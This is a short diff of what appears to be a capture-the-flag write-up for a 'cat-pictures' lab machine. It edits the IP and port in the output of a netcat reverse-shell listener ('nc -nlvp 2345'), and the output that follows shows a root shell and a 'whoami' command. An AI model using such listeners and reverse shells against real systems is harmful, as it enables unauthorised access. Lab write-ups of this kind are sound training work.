@@ -471,7 +471,7 @@ nc -nlvp 2345
 
 Wait until I obtained the access
 ```
-Connection from 10.10.42.1 35448 received!
+Connection from 10.6.96.167 2345 received!
 bash: cannot set terminal process group (5261): Inappropriate ioctl for device
 bash: no job control in this shell
 root@cat-pictures:~# whoami
